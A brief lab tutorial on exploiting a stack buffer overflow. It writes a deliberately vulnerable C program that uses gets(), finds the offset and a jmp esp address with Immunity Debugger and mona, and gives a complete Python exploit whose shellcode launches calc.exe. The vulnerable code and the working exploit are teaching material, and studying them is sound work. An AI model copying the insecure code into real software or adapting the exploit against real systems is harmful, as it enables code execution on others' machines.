# Basic bufferover

Required software

- python 2.7.x
- Immunity debugger - https://www.immunityinc.com/products/debugger/
- MinGW (gcc) - https://sourceforge.net/projects/mingw-w64/files/Toolchains%20targetting%20Win32/Automated%20Builds/


# Write a program

Write code

```
#include <stdio.h>

int main() {
char str[50];

printf("Enter your name");
gets(str);
printf("Hello %s\n", str);

return 0;
}
```

Compile

```
gcc -m32 overflow.c -o overflow.exe
```

# Load Debugger

load immunity and use the folder or file to open and then locate overflow.exe
at the bottom of the screen set a working directory
```
!mona config -set workingfolder c:\mona\%p
```

open pattern.txt and copy and paste the pattern into your exe
```
!mona pc 100
```

use this as a pattern offset to workout how many junk bites are required in our case 62 bytes are junk
```
!mona po 31634130
```

look for a esp jump command to workout where your payload would be

```
!mona jmp -r esp -m kernel
```

```
Log data, item 24
 Address=76C9FB75
 Message=  0x76c9fb75 (b+0x0013fb75)  : jmp esp |  {PAGE_EXECUTE_READ} [KERNELBASE.dll] ASLR: True, Rebase: True, SafeSEH: True, OS: True, v10.0.17763.1 (C:\WINDOWS\System32\KERNELBASE.dll)
```

# Write the expoilt

- Use python

- 2nd line - 62 junk bytes
- 3rd line - esp jump address input it backwards
- 4th line - exec calc.exe in hex

- 5/6 opens payload and excutes


```
from subprocess import Popen, PIPE
payload = b"\xc4"*62
payload += b"\x75\xFB\xC9\x76"
payload += (b"\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
b"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7"
b"\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
b"\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a"
b"\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
b"\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7")

p = Popen(["overflow.exe"], stdout=PIPE, stdin=PIPE)
p.communicate(payload)
```

